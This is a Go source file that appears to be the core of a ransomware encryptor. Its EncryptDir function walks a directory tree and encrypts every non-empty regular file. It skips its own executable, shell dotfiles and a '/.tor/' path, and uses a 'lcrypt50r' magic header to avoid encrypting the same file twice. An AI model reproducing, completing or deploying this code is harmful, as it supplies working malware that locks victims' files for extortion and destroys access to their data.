package core

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
)

// EncryptDir -> encrypts the dir recursively
func EncryptDir(dirPath string, key *[]byte) {
	if len(*key) != 32 {
		log.Fatal("Nop")
	}

    ch := make(chan string)
	exeInfo, err := os.Stat(os.Args[0])

	if err != nil {
		fmt.Println("Err wrapper 0")
        log.Fatal(err)
	}

	go func() {
		e := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				fmt.Println("Err wrapper 1")
                log.Fatal(err)
			}

			if m := info.Mode(); info.Size() > int64(0) && !os.SameFile(exeInfo, info) && !strings.HasPrefix(info.Name(), ".bash") && m.IsRegular() && !info.IsDir() && !verifyMagic(path) && !strings.Contains(path, "/.tor/") {
				ch <- path
			}

			return nil
		})

		close(ch)

		if e != nil {
            fmt.Println("Err wrapper 2")
			log.Fatal(e)
		}
	}()

	encryptWrapper(ch, key)
}

func encryptWrapper(ch chan string, key *[]byte) {
	for path := range ch {
		encrypt(path, key)
	}
}

func verifyMagic(filePath string) bool {
	file, err := os.Open(filePath)

	if err != nil {
        fmt.Println("Err wrapper 3")
		log.Fatal(err)
	}

	defer file.Close()

	magic := make([]byte, 9)

	_, err = file.Read(magic)

	if err != nil {
		return false
	}

	checksumtoHex := fmt.Sprintf("%x", magic)

	if cmp := strings.Compare(checksumtoHex, "6c6372797074353072"); cmp != 0 {
		return false
	}

	return true
}
